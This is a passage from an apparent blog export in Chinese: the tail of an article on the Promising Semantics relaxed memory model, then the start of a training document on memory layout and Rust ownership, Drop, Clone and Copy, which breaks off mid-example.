的 $y = 2$ 进行了 fetch and add。根据我们上面所说，fetch and add 会将 $y = 2$ 的 message view 也合入到自己的 message view 中，线程 3 在接收 $y = 3$ 并进行 acquire 的时候，$x = 1$ 就沿着 $y = 2$，到达 $FAA(y,1)$ 然后到达线程 3 的 cur view，于是线程 3 在后面读 x 的时候必然是读到 $x = 1$。\r\n\r\n值得注意的是，线程 2 再进行 fetch and add 之后，还是有可能读到 $x = 0$ 的。\r\n\r\n### 3.4 SC Fences\r\n\r\n为了支持 sc fence，Promising Semantics 再次进行了扩展，其引入了一个 global view，这个 view 是只有一个的，并非每个线程都有一个。当某个线程执行 fence-sc 操作的时候，该线程的 cur view 和 global view 都会变成这两种较大的那个，即 $\\text{cur view} = \\text{global view} = max(\\text{cur view}, \\text{global view})$。\r\n\r\n![image-20251221105823006](https://api.file.caiwen.work/picture/2025/12/21/image-20251221105823006.png)\r\n\r\n比如上面的例子，$x = 1$ 之后进行 fence-sc，于是 global view 就会包含 $x = 1$。线程 2 进行 $y = 1$ 后进行 fence-sc，于是 global view 就会既包含 $x = 1$ 又包含 $y = 1$，并且线程 2 的 cur view 也包含了 $x = 1$，于是后面 $b$ 就不可能读到 $0$。\r\n\r\n### 3.5 Plain Access\r\n\r\n其实我们上面如果不加特殊说明，所有的非 release 和 acquire 操作都是 relaxed 操作。而 C++ 中，没特殊说明访问方式的操作并非是 relaxed 操作，而是 plain acccess。编译器会对 plain access 进行更加激进的优化，使得一些 per-location coherence 得不到保证。\r\n\r\n![image-20251221110749351](https://api.file.caiwen.work/picture/2025/12/21/image-20251221110749351.png)\r\n\r\n比如上面这个例子，编译器在考虑线程 2 的时候并不会得知线程 1 的存在，于是可能会将 $b = x$ 移到前面去（反正对一个地址进行两次读，在编译器眼里这两个顺序无所谓），变成右边那个样子。但是在程序员眼中代码还是左边那个样子，看起来是不满足 Read-Read Coherence 了。\r\n\r\n为了解释这种情况，Promising Semantics 又进行了扩展，他把每个线程的 cur view 拆成了两个分量：pln 分量和 rlx 分量。rlx 分量就相当于之前 cur view 没有拆分时的样子，并且有 pln 分量是小于等于 rlx 分量的。当对于 $x$ 进行一个 plain read 的时候，只能读时间戳大于 $pln(x)$ 的消息，并且读完只会去更新 $rlx$ 分量。对于 $x$ 进行一个 plain write 的时候，则需要保证写入消息的时间戳要大于 $rlx(x)$，并且写完之后既会更新 $pln$ 分量又会更新 $rlx$ 分量。\r\n\r\n## 4. 完整模型\r\n\r\n下面形式化定义中的符号具体含义可以参考论文的第 4 页和第 8 页。\r\n\r\n- $o$ 表示访问方式，有 $pln$（plain）、$rlx$（releaxed）、$ra$（release/acquire），并且这几个访问方式还形成了一个集合关系：$pln \\subset rlx \\subset ra$。并且这里的 $ra$ 指的是 release/acquire access\r\n\r\n### 4.1 Read\r\n\r\n![image-20251221113130869](https://api.file.caiwen.work/picture/2025/12/21/image-20251221113130869.png)\r\n\r\n![image-20251221113244194](https://api.file.caiwen.work/picture/2025/12/21/image-20251221113244194.png)\r\n\r\n对于 read-helper，前两个关于时间戳 $t$ 的限制就是我们在 Plain Access 中所讲的。\r\n\r\n$V$ 则表示了当前操作进行之后，cur view 的增量，可以看到无论是哪种访问方式，都会增加 $rlx$ 分量（releaxed/release/acquire 都有同步的作用，plain 没有），而 $pln$ 访问方式却不更新 $pln$ 分量（read-read coherence 会被破坏）。\r\n\r\nacq view 基本和 cur view 进行一样的更新。\r\n\r\nplain 访问并不会将 message view 合入到 cur view 或是 acq view。除了 plain 以外的访问类型，都会将 message view 合入 acq view（正如我们之前说 release/acquire fence 的时候所讲的）。而 acquire/release 还会直接把 message view 合入到 cur view（这里 read 其实主要和 acquire 有关了，acquire access 自带了 acquire fence）。\r\n\r\n值得注意的是 read 并不会更新 rel view。\r\n\r\n### 4.2 Write\r\n\r\n![image-20251221120418221](https://api.file.caiwen.work/picture/2025/12/21/image-20251221120418221.png)\r\n\r\n![image-20251221120429622](https://api.file.caiwen.work/picture/2025/12/21/image-20251221120429622.png)\r\n\r\n正如我们在 Plain Access 中所讲的，写入的时候选取的时间戳 $t$ 一定要大于 cur view 的 rlx 分量。\r\n\r\n无论是何种访问模式，都会更新 pln 和 rlx 两个分量。\r\n\r\n无论是何种访问模式，都会更新 rel view。如果是 ra 的话（主要是 release），还会直接让 x 位置的 rel view 直接同步到 cur view。\r\n\r\n对于 write 操作插入的消息的 message view，plain 访问类型并不会携带 message view，其余的访问类型会携带当前位置的 rel view（其实还会并上 $R_r$，这个主要用于我们之前所说的 Release Sequences）。\r\n\r\n这里还要求，如果是 ra（主要是 release access）的话，那么此时所有发起，且还没兑现的 promise 的 message view 必须是空集。我个人的理解是这里是为了允许 plain access 越过 release access 提前 promise 的。但是搞不懂的是，即使是 relaxed access，越过 release access 进行 promise 时也可以令其 message view 为一个空集。Gemini 给我的解释是 release access 后面的发起的 message 的 message view 本应该是包含 rel view，但是 promise 时令他是空集，这就发生矛盾了（或者说 message view 不同的话就无法兑现？）\r\n\r\n### 4.3 Update\r\n\r\n![image-20251221123307714](https://api.file.caiwen.work/picture/2025/12/21/image-20251221123307714.png)\r\n\r\natomic update 相当于把 read 和 write 连在一块了。需要特殊注意的是，atomic update 会将其 read 操作得到的 message view 合入其 write 操作产生的 message 的 message view 中。（为了实现 Release Sequences）\r\n\r\n### 4.4 SC Fence\r\n\r\n![image-20251221123014491](https://api.file.caiwen.work/picture/2025/12/21/image-20251221123014491.png)\r\n\r\n![image-20251221123006714](https://api.file.caiwen.work/picture/2025/12/21/image-20251221123006714.png)\r\n\r\nSC-FENCE-HELPER 中的 $S$ 可以认为是 global view。\r\n\r\n行为比较简单，就是 cur view、acq view、rel view 全部大力更新成 global view。\r\n\r\n不过这里也要求，进行 sc fence 时不能有尚未兑现的 promise，或者这个 promise 是 plain write 的。\r\n\r\n### 4.5 Release / Acquire Fence\r\n\r\n![](https://api.file.caiwen.work/picture/2025/12/21/image-20251221123642050.png)\r\n\n","summary":"Promising Semantics是一种宽松内存模型解释方法，通过多值内存、视图和承诺机制解释并发程序中的指令重排和内存可见性问题，支持原子操作和同步原语。","key":["并行","内存","内存模型","promising-semantics","popl"],"tags":[],"path":["cs","Promising Semantics.md"],"background":"https://api.file.caiwen.work/picture/2025/12/21/20251221131016581.png","recommend":false,"status":"published"},{"type":"Article","title":"Rust与内存安全","id":"rust-memory-safety","createTime":"2025-12-11T13:14:00.000Z","updateTime":"2025-12-21T05:24:44.180Z","content":"\r\n::: info 说明\r\n本文为湖南大学易千工作室技术部门的第三次培训文档\r\n:::\r\n\r\n## 1. 内存\r\n\r\n### 1.1 什么是内存\r\n\r\n计算机分内存和储存，我们一般认识到的存储容量是硬盘的容量，存放着我们的各种数据：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/29/image-20251029213811293.png)\r\n\r\n关于内存，我们可以在任务管理器中查看到关于他的容量以及占用信息等：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/29/image-20251029214110808.png)\r\n\r\n相比于储存\r\n\r\n- 内存比较小（8G、16G，32G...）。\r\n- 当电脑关机后，内存中的数据会立刻消失。\r\n- 但是内存的读写速度非常快，比硬盘读写快很多（似乎能达到70GB/s）。因此我们的操作系统会把比较常用的数据存放在内存中。\r\n\r\n（例：如果你的手机或是电脑内存比较小的话，就容易发生卡顿，这是因为内存不够用了，操作系统就会迫不得已把数据存放在储存中，而储存的读写速度相比于内存慢的很，于是就卡了）\r\n\r\n我们在操作系统上运行的所有程序，大部分数据，都是放在内存的：\r\n\r\n![image-20251103110019378](https://api.file.caiwen.work/picture/2025/11/03/image-20251103110019378.png)\r\n\r\n### 1.2 使用内存\r\n\r\n内存可以视为一个非常大的数组。理论上我们可以在这个非常大的数组中随便存取数据。\r\n\r\n对于普通数组，我们使用下标来访问\r\n\r\n```cpp\r\nint data = arr[index];\r\n```\r\n\r\n对于内存，我们也需要一个“下标”来访问。对于内存，“下标”实际上就是地址。\r\n\r\n```cpp\r\nint data = *addr;\r\n```\r\n\r\n`*` 叫做解引用，可以把一个内存地址的数据取出来，类似数组的 `[]`。\r\n\r\nC++ 是强类型语言，我们需要注意一下类型。上面的数组的例子，`arr` 的类型应该是 `int[]`。\r\n\r\n而对于内存似乎没这么自然。\r\n\r\n众所周知，计算机中的数据都是 0 和 1 二进制表示的。0/1 叫做位。而计算机实际上并不会一位一位地运算，计算机实际上是把 8 个位看成一个整体进行操作。8 位称为一个字节。\r\n\r\n```\r\n0010100011000011\r\n——————-- -> 一个字节\r\n^\t\t -> 一个位\r\n```\r\n\r\n在 C++ 中，字节对应于 `char` 类型。准确来说是 `unsigned char` 类型。\r\n\r\n那么我们可以把内存视为一个非常大的 `unsigned char` 数组。\r\n\r\n`*` 只能对“指针”这个数据类型进行操作。很多人闻指针色变，但我认为指针实际上就是一个地址，只不过又加了一个类型。\r\n\r\n```\r\n 12 13 14 15 16 17 18\r\n|  |  |  |  |  |  |  |\r\n^---\t\t\tcond1\r\n^------\t\t\tcond2\r\n^------------\tcond3\r\n```\r\n\r\n如上图，现在我们想获得内存中 12 这个位置的数据。按照“内存是一个非常大的 `unsigned char` 数组“的观点，12 处数据应该是一个 `unsigned char` 数据。\r\n\r\n```cpp\r\nunsigned char *addr = (unsigned char *)12;\r\nunsigned char data = *addr;\r\n```\r\n\r\n这里的 `*` 出现位置不同表示不同的含义。如果出现在类型上，则表示是一个指针类型。如果用作运算符，则表示解引用操作。\r\n\r\n这里还要再提一点，数据类型和数据本身没啥关系，数据类型只是告诉编译器应该把这个数据解释成什么东西。因此我们还可以这样：\r\n\r\n```cpp\r\nbool *addr = (bool*)12;\r\nbool data = *addr;\r\n```\r\n\r\n上面例子中的 `unsigned char` 和 `bool` 类型都是只占用 1 个字节的。如 cond1 所示。\r\n\r\n如果我们写成：\r\n\r\n```cpp\r\nshort *addr = (short*)12;\r\nshort data = *addr;\r\n```\r\n\r\n由于 `short` 是占用 2 字节的，上面这个代码就会从指针处的位置开始，向后读取两个数据，然后根据某些编码规则将其解释成 `short` 类型。类似 cond2 那样。\r\n\r\n又比如我们最喜欢的 `int` 类型：\r\n\r\n```cpp\r\nint *addr = (int*)12;\r\nint data = *addr;\r\n```\r\n\r\n这个 `*` 解引用实际上直接读了 4 个数据，类似 cond3 那样。\r\n\r\n上面提到，我们定义的变量也是放在内存中的。那么就有个疑问，它放在了内存的那个位置？我们可以用 `&` 取地址运算符来得到答案，`&` 运算符将会得到一个指针。\r\n\r\n```cpp\r\nint a;\r\nint *addr = &a;\r\nstd::cout << addr << endl;\r\n```\r\n\r\n综合我们所讲的东西，我们还可以这么玩：\r\n\r\n```cpp\r\nint a = 114514;\r\ndouble *p = (double *)&a;\r\nstd::cout << *p << endl;\r\n```\r\n\r\n### 1.3 内存分布\r\n\r\n如果你直接去运行上面所讲的代码，如：\r\n\r\n```cpp\r\nint *addr = (int*)12;\r\nint data = *addr;\r\n```\r\n\r\n会发现程序出现段错误，其中的原因我们将会逐步解释。\r\n\r\n还记得吗，我们的电脑上，各个程序之间是共享内存的：\r\n\r\n![image-20251103110019378](https://api.file.caiwen.work/picture/2025/11/03/image-20251103110019378.png)\r\n\r\n现在我们已经知道了怎么去利用内存，那么有一个想法就是，能不能访问别的程序的内存？理论上是可以的，但这样不太安全，因为这样一个恶意的程序可以随便破坏内存数据，使得电脑崩溃。于是，现代操作系统有一个“虚拟内存”技术，即在每个程序的眼中，他是独占所有的内存的，看不到其他程序：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/29/image-20251029220246267.png)\r\n\r\n同时，理论上来说，你作为程序的编写者，可以随意支配这“虚拟空间”内的所有内存。但是为了能让程序正常运行，我们不得不遵循一些约定：内存中不同的位置的内存是有他的作用的。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/29/image-20251029220745845.png)\r\n\r\n- 整个内存空间的最上面，是分给操作系统用的，你不能乱用\r\n- 在比较靠上面的区域，叫做栈，我们后面会细说。如果这块区域的内存不够用了就向下扩容\r\n- 再靠下一点的区域，叫做堆，我们后面会细说。如果这块区域的内存不够用了就向上扩容\r\n- 再往下的区域，我们称之为段。有很多段，每个段都有自己的名称和作用，比较值得注意的是这些段：\r\n  - `.text` 段：你的程序的代码（准确来说是已经编译好的机器码，CPU能够直接执行的）放在这里。当程序加载完毕之后CPU将会执行这里的代码来执行你的程序。\r\n  - `.data` 段：如果你定义了有初始值的全局变量，那么这个初始值的数据就放在这里\r\n  - `.rodata` 段：一些常量会放在这里，比如最常见的 `cout<<\"hello,world\";`，这个 `\"hello,world\"` 字符串就放在这里\r\n  - `.bss` 段：如果你定义了没有初始值的全局变量，那么这个全局变量会存在于内存的这个位置。`.bss` 段会被操作系统清 0，这也就是为什么 C++ 中的全局变量默认值为 0\r\n\r\n其中 `.text/.data/.rodata` 这些段都是在编译时被写进可执行文件（如 `.exe` 文件中的）\r\n\r\n除了上述这些内存区域之外，其他的内存区域你是不能够访问的。然后再来看我们刚才的代码，`12` 这个位置在上图中没有对应任何区域，因此你直接访问就会报错。\r\n\r\n那么其实我们在电脑上点击一个 `exe` 文件时启动一个程序时，操作系统无非干了这么几件事：\r\n\r\n- 给我们的程序分配了一个“虚拟”的内存空间\r\n- 把 `.exe` 文件中的 `.text/.data/.rodata` 部分的数据解析出来，存到内存中\r\n- 又开辟了 `.bss` 段，堆、栈这些内存区域\r\n- 执行 `.text` 段的代码\r\n\r\n然后我们来到代码层面。一般来说，函数中的局部变量是开在栈上的：\r\n\r\n```cpp\r\nint a;\r\n```\r\n\r\n定义变量，于是栈指针 `%rsp` 就向下移动，移动后会在栈区域腾出一块空间，这个空间就存放着我们定义的变量。\r\n\r\n栈有个性质，你只能在栈的顶部（也就是 `%rsp` 所指的位置）添加数据或者是删除数据。添加和删除的时候只需要移动 `%rsp` 指针即可做到。\r\n\r\n栈的这个性质也可以很方便地处理函数调用：\r\n\r\n```cpp\r\nvoid func1();\r\nvoid func2(int);\r\n\r\nint main(){\r\n    int a, b;\r\n    cin >> a >> b;\r\n    // do something...\r\n    func1();\r\n    return 0;\r\n}\r\nvoid func1(){\r\n    int c = 1, d;\r\n    func2(c);\r\n}\r\nvoid func2(int x){\r\n    if(x == 2) return;\r\n    char *str = \"hello\";\r\n    cout << str << endl;\r\n    func2(x + 1);\r\n}\r\n```\r\n\r\n我们看一下上述代码的执行过程中栈的变化：\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------| <- %rsp\r\n```\r\n\r\n首先，`main` 函数刚执行的时候，栈中可能有一些其他的数据。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------| <- %rsp\r\n```\r\n\r\n定义了变量。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     c      |\r\n|------------|\r\n|     d      |\r\n|------------| <- %rsp\r\n```\r\n\r\n`main` 函数调用 `func1` 前，会先在栈中放置一个返回的地址。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     c      |\r\n|------------|\r\n|     d      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------| <- %rsp\r\n```\r\n\r\n调用 `func2` 时，`func1` 除了也在栈中放置一个返回地址外，还把当前的 `c` 复制了一份再放入栈中，以此来达到传递参数的目的。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     c      |\r\n|------------|\r\n|     d      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------|\r\n|    str     |\r\n|------------| <- %rsp\r\n```\r\n\r\n然后声明了变量 `str`。\r\n\r\n`cout` 实际上发生了函数的调用，对栈也会产生影响，简单起见我们忽略掉中间这些。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     c      |\r\n|------------|\r\n|     d      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------|\r\n|    str     |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------| <- %rsp\r\n```\r\n\r\n然后进行一次递归，后面 `func2` 开始返回了，函数返回之后，函数内部所定义的变量都不会在使用到了，所以可以把他们从内存中清除掉。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     c      |\r\n|------------|\r\n|     d      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------|\r\n|    str     |\r\n|------------|\r\n|return addr |\r\n|------------| <- %rsp\r\n|     x      |\r\n|------------|\r\n```\r\n\r\n清理时，我们只需要改变一下 `%rsp` 指针即可，原来的变量可能还留在内存中，但其实已经被清理掉了。\r\n\r\n我们说局部变量的默认值不一定会是 0，就是这个道理，因为新变量的内存位置在原来可能存在了数据。\r\n\r\n函数返回时，他要知道回到哪里去，所以此时从栈顶就能得到返回地址了。\r\n\r\n```\r\n|------------|\r\n|    .....   |\r\n|------------|\r\n|     a      |\r\n|------------|\r\n|     b      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     c      |\r\n|------------|\r\n|     d      |\r\n|------------|\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------|\r\n|    str     |\r\n|------------| <- %rsp\r\n|return addr |\r\n|------------|\r\n|     x      |\r\n|------------|\r\n```\r\n\r\n只使用栈会有一些局限性。首先，栈一般比较小，如果你有比较大的数据，就不适合放入栈中。同时，我们看到，栈中的数据的“生命周期”和当前函数相当，如果当前函数结束的话，那么其在栈中的数据也会被清理，有时候我们可能希望数据在函数结束时仍然保留。还有种情况，如果我想扩容/缩容某个数据所占内存空间，那么栈将会比较难以做到。\r\n\r\n于是我们就有堆这个东西。堆的使用就比较自由了，你的程序可以自由使用堆的内存。而且堆往往很大，而且如果堆不够用了我们还可以向操作系统申请扩容。\r\n\r\n那么我们就来想一个问题，如果我们想在堆中放一个数据，我们该怎么做？首先数据放在哪里？我们可以简单地像栈一样维护一个指针，表示指针之后的数据都可以进行分配。然后再考虑，如果我要把堆中的某个数据释放掉怎么办？有可能我先在堆中放置了若干个数据，然后把其中的一些数据释放掉，此时就不能简单地像栈那样维护一个指针了，而是可能要记录堆中哪些位置是空闲的。同时随着堆内空间不断地被分配又释放，堆中可能出现很多零散的空间，变得碎片化，此时一个高效的分配策略就显得很重要。总之，使用堆要考虑的问题非常多...\r\n\r\n关于堆的使用，有很多内存分配算法来解决。C/C++ 的标准库中就实现了一个内存分配算法。我们直观地来看就是为我们提供了 `malloc` 和 `free` 等函数\r\n\r\n`malloc` 函数将自动帮我们在堆中分出一块指定大小的内存：\r\n\r\n```cpp\r\nint *arr = (int*)malloc(sizeof(int)*100);\r\n```\r\n\r\n`malloc` 返回一个 `void*` 类型，需要我们再手动，转换成自己需要的指针类型。上述这个代码就相当于申请了一块内存，这块内存可以存 100 个 int。这块内存是被放在堆上的。\r\n\r\n`arr` 作为一个指针位于栈中。当 `arr` 所处的函数结束之后，`arr` 将会被清理，但是只是指针本身被清理，指针指向的内存仍留在堆中。\r\n\r\n堆中的内存的生命周期基本上和任何东西都没有什么关联。堆中的内存，除非你手动使用 `free` 函数释放，否则他就会一直留在堆中，直到程序结束，由操作系统释放掉程序所占有的内存。\r\n\r\n```cpp\r\nfree(arr);\r\n```\r\n\r\n### 1.4 内存安全\r\n\r\n在堆上开内存好是好，但是如果你不小心忘记了把开在堆上的内存释放了，那么你的程序可能会一直占用着内存，使得内存只增不减，直到消耗完电脑的全部内存，程序崩溃。我们管这种情形叫做“内存泄漏”。\r\n\r\n对于 C 和 C++ 这种语言，需要你手动管理内存，申请完的内存在不需要使用了时候要释放掉。但是有时候你可能难以做到这一点：\r\n\r\n![image-20251120120648728](https://api.file.caiwen.work/picture/2025/11/20/image-20251120120648728.png)\r\n\r\n![image-20251120120706113](https://api.file.caiwen.work/picture/2025/11/20/image-20251120120706113.png)\r\n\r\n同时，如果你在释放掉内存之后，还在使用那块内存的话，就会出现\"悬垂引用\"。同时，栈上的内存也会出现悬垂引用。\r\n\r\n![image-20251120120948574](https://api.file.caiwen.work/picture/2025/11/20/image-20251120120948574.png)\r\n\r\n内存安全主要考虑这两件事：该释放的内存要释放（否则就是内存泄漏了），不该释放的内存不要释放（否则就是悬垂引用了）。\r\n\r\n## 2. Rust 内存安全\r\n\r\n关于内存安全，主要有两大阵营：\r\n\r\n- 第一个阵营是以 C 和 C++ 为代表的，他们希望给程序员最大限度的自由，让程序员手动管理内存。\r\n- 第二个阵营是以 Java、Python 为代表的，同时也是绝大部分编程语言的选择，他们设计了一套垃圾回收（GC）的算法，程序在运行过程中自动回收没有被使用的内存。有 GC 的编程语言的效率往往低一些。\r\n\r\nRust 则站在了第三个阵营，他精心设计了一套规则，用编译器来强制执行这套规则，使得程序员难以写出内存不安全的代码。\r\n\r\n### 2.1 Vec 和 String\r\n\r\n为了方便我们后面举例，这里先介绍两个东西：`Vec` 和 `String`。\r\n\r\n```rust\r\nlet padovan = vec![1,1,1,2,2,3,4,5,7,9];\r\n```\r\n\r\n![image-20251120134144667](https://api.file.caiwen.work/picture/2025/11/20/image-20251120134144667.png)\r\n\r\n`Vec` 既使用了栈又使用了堆。他把具体的数据都放在堆上，而栈上则只存放三个东西：指向`Vec`已经在堆上申请的内存的一块连续内存的指针（`buffer`），元素的数量（`length`），以及目前已申请的内存块最多能存储的数量（`capacity`）。\r\n\r\n当我们往 `Vec` 里面添加元素时，如果 `Vec` 的 `length` 小于 `capacity` 的话，那么可以直接在已经申请的内存块中添加。但如果内存块中的空间不够再继续加元素了，那么此时就需要扩容。`Vec` 将会在堆中申请一块更大的内存，然后再把原来的数据复制过去，再把原来的数据释放掉。\r\n\r\n扩容也是有讲究的，每次扩容不能太大（不然会有很多浪费），也不能太小（不然会频繁进行内存复制，使得程序效率降低）。一般来说，每次扩容会扩容到原来容量的多少倍。\r\n\r\n对于 `String`，我们可以将其视为元素为 `u8` 类型的 `Vec`，于是 `String` 的结构就不再过多赘述。（这里 `u8` 表示一个字节。不是 `char` 是因为 Rust 中的 char 和 C++ 不同，是固定 4 字节的（按 Unicode 编码））。\r\n\r\n然后我们发现，`String` 和 `Vec` 的主要数据都放在堆上，然后 `String` 和 `Vec` 本身是指向堆上的指针再加上一些额外的数据。因此，某种意义上 `String` 和 `Vec` 可以说是“胖指针”。\r\n\r\n### 2.2 所有权\r\n\r\n当我们使用 `let` 定义变量的时候，我们应该视为创建了一个数据，然后把这个数据的“所有权”进行了绑定。你需要把变量和数据分开来看。\r\n\r\n```rust\r\nlet s = vec![\"udon\".to_string(), \"ramen\".to_string(), \"soba\".to_string()];\r\n```\r\n\r\n![image-20251124170854973](https://api.file.caiwen.work/picture/2025/11/24/image-20251124170854973.png)\r\n\r\nRust 中，`=` 不仅是赋值，还意味着所有权的转移：\r\n\r\n```rust\r\nlet t = s;\r\n```\r\n\r\n![image-20251124171408457](https://api.file.caiwen.work/picture/2025/11/24/image-20251124171408457.png)\r\n\r\n上述代码会把 `s` 的数据的所有权交给 `t`，而 `s` 变成未初始化状态（没有拥有任何数据）\r\n\r\n此时我们再写：\r\n\r\n```rust\r\nlet u = s;\r\n```\r\n\r\n![image-20251124171908074](https://api.file.caiwen.work/picture/2025/11/24/image-20251124171908074.png)\r\n\r\n#### 2.2.1 Drop\r\n\r\n一个变量拥有某个数据的所有权，这意味着这个数据的内存由这个变量管理。如果一个变量是某个数据的所有者，当这个变量掉出作用域时，这个变量肯定是不会再使用到了，其拥有的数据就应该被释放。（类似于我们之前讲栈时说的那样，但是这里扩充了一下，不仅仅是函数结束后函数内的变量释放，而是变量所处作用域结束，变量就被释放）\r\n\r\n```rust\r\n{\r\n    let s = vec![\"udon\".to_string(), \"ramen\".to_string(), \"soba\".to_string()];\r\n    // do something\r\n} // 这里 s 就被释放掉了\r\nprintln!(\"{}\", s); // s 已经被释放，这里不能再使用\r\n```\r\n\r\n![image-20251124172429415](https://api.file.caiwen.work/picture/2025/11/24/image-20251124172429415.png)\r\n\r\n当然这些并不是理所当然的。Rust 在释放变量所拥有的数据的时候，会先判断其数据类型是否实现了 Drop trait，如果没有则仅释放其在栈上的数据，反之则调用其 drop 函数，然后再释放其在栈上的数据。同时这个过程是递归的，也就是如果我准备释放一个结构体，那么我会先释放结构体的成员。如果这个成员也是结构体的话，这个过程就会递归下去。\r\n\r\n拿 `String` 举例：\r\n\r\n```rust\r\n// https://doc.rust-lang.org/src/alloc/string.rs.html\r\npub struct String {\r\n    vec: Vec<u8>,\r\n}\r\n\r\n// https://doc.rust-lang.org/src/alloc/vec/mod.rs.html\r\npub struct Vec<T, #[unstable(feature = \"allocator_api\", issue = \"32838\")] A: Allocator = Global> {\r\n    buf: RawVec<T, A>,\r\n    len: usize,\r\n}\r\n\r\n// https://doc.rust-lang.org/nomicon/vec/vec-raw.html\r\nstruct RawVec<T> {\r\n    ptr: NonNull<T>,\r\n    cap: usize,\r\n}\r\n\r\nimpl<T> Drop for RawVec<T> {\r\n    fn drop(&mut self) {\r\n        if self.cap != 0 {\r\n            let layout = Layout::array::<T>(self.cap).unwrap();\r\n            unsafe {\r\n                alloc::dealloc(self.ptr.as_ptr() as *mut u8, layout);\r\n            }\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n我们可以在 drop 函数中来释放掉当前类型在堆上关联的数据。于是堆上内存生命周期和栈上内存相绑定，我们之前所说的堆上内存释放时机不好把控的问题就解决了。这样的数据类型本质上也是指针，由于其能够在合适的时机自动释放栈上内存，因此也叫做智能指针。\r\n\r\ndrop 函数非常类似 C++ 中的析构函数。\r\n\r\n同时这里再强调一下，我们说某个变量“拥有”某个数据，这个数据指的是栈上数据，栈上的数据有且仅有一个所有者。堆上数据并没有所有者，多数情况下我们是通过 `drop` 函数和栈上的指针，将堆上数据和栈上数据关联起来的。\r\n\r\n总结：所有权 -> Drop -> 堆上内存生命周期和栈上数据相绑定 -> 内存安全\r\n\r\n#### 2.2.2 Clone\r\n\r\n如果我们在 C++ 中写类似上述的代码，`s` 赋值给 `u` 后也能赋值给 `t`。这是因为 C++ 中，赋值时的行为是由一个叫做赋值拷贝构造函数决定的。C++ 中很多类型默认的行为是将其在栈上的数据都完全赋值一份：\r\n\r\n![qq_pic_merged_1765167653151](https://api.file.caiwen.work/picture/2025/12/08/qq_pic_merged_1765167653151.jpg)\r\n\r\n所以在 C++ 中我们可能不知不觉进行了很多内存的复制，但是复制内存是有代价的，Rust 希望你自己决定要不要来复制。\r\n\r\nRust 的设计是，赋值相当于数据的转移而非像 C++ 这样隐含着数据的复制（并且由于赋值拷贝构造函数的存在，你也不好直接判断使用 `=` 赋值之后发生了什么，而 Rust 则更简单直接，就是数据的转移）。如果你确实需要复制数据，那么你需要手动写出代码来进行这个操作。这也使得代码的行为更加确定。\r\n\r\n有些数据类型，如 `String` 和 `Vec`，这样的数据类型实现了 Clone trait，表示可以复制。实现了 Clone trait 的类型就可以使用 `.clone` 这个函数：\r\n\r\n![image-20251208133201323](https://api.file.caiwen.work/picture/2025/12/08/image-20251208133201323.png)\r\n\r\n这个函数可以允许在你只获得某个变量的借用的情况下，将该变量的数据复制一份，然后返回这个数据的所有权。例如，在`Vec`上使用`.clone()`会将堆上的的每个元素都`.clone()`，再以此构建一个新的`Vec`。\r\n\r\nRust 默认的 Clone 只是赋值了栈上数据，和堆上数据没有什么关系。`String` 和 `Vec` 这种往往在实现 Clone trait 时，自定义了 `clone` 函数，在这个函数内进行了堆上数据的复制。类似 Drop。\r\n\r\n又比如，如果我们也想让上面的赋值行为和 C++ 一样的话，我们可以这么写：\r\n\r\n```rust\r\nlet t = s.clone();\r\nlet u = s.clone();\r\n```\r\n\r\n并非所有的数据类型都是可以复制的，这样的数据类型往往有着特殊含义。比如 `std::sync::MutexGuard`，当调用 `Mutex::lock()` 时就会获得他。他是当前线程持有某个数据的凭证，只有获得该凭证的线程才能访问对应的数据。`Mutex` 要求每时每刻最多只能存在一个 `MutexGuard`，`MutexGuard` 没有实现 Clone trait。\r\n\r\n#### 2.2.3 Copy\r\n\r\n有些数据类型，比如 `i32` 这种基本数据类型，他的复制是没成本的，而且也没什么特殊含义，可以随便复制。这种数据类型往往实现了 Copy trait，带有这种 trait 就意味着编译器可以在赋值时自动将其在栈上的数据原封不动地复制过去，而不再搞什么所有权的转移。\r\n\r\n```rust\r\nlet a = 114514;\r\nlet b = a;\r\nlet c = a;\r\n```\r\n\r\n总结：\r\n\r\n- Rust 的赋值含义很简单，就表示栈上数据的移动（对于没有实现 Copy trait 的数据类型）（没有堆上数据的移动）。\r\n- 而 C++ 的赋值行为则很不确定\r\n  - 默认情况下是复制栈上内存，这相当于给所有数据类型都实现了 Copy trait\r\n  - 赋值的行为还可以通过赋值拷贝构造函数自定义，这相当于赋值时自动调用 `.clone`\r\n\r\n同时，所有权和 Drop trait 的配合使得内存被正确地，自动地释放。当然他不只是针对于内存，我们可以在 `drop` 函数中关联到任何的资源（内存也是一种资源），比如文件描述符，当你在向操作系统申请一个文件描述符时，表示你正在访问一个文件，文件描述符是有限的，我们需要在合适的时机释放掉，此时我们遇到了和管理内存同样的问题，我们像管理堆上内存那样在 `drop` 函数中释放文件描述符写，使得其被正确地，自动地释放。\r\n\r\n### 2.3 引用/借用\r\n\r\n```rust\r\nfn f(a: String, b: String) {\r\n  